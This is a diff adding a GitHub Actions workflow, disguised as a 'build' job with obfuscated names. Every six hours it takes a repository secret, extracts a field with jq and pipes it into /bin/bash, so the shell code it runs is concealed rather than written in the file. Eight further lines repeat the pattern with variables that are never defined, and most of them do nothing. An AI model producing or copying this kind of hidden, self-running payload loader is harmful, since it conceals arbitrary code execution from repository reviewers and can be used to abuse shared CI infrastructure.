@@ -1,0 +1,26 @@
+name: laojiangzhongzheng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laojiangzhongzheng
+        env:
+          tg43115: ${{ secrets.tg43115 }}
+        run: |
+          echo $tg43115 | jq -r .gpuq8732 | /bin/bash
+          echo $bwpa695 | jq -r .feyxx55 | /bin/bash
+          echo $jfj91 | jq -r .cuvwv65754 | /bin/bash
+          echo $hm22200 | jq -r .jsx0 | /bin/bash
+          echo $x424 | jq -r .wvk8594 | /bin/bash
+          echo $sjbf596 | jq -r .vjuup50366 | /bin/bash
+          echo $v13 | jq -r .qrxi413 | /bin/bash
+          echo $wk52 | jq -r .mtyti38 | /bin/bash
+          echo $l842 | jq -r .ia14 | /bin/bash
+
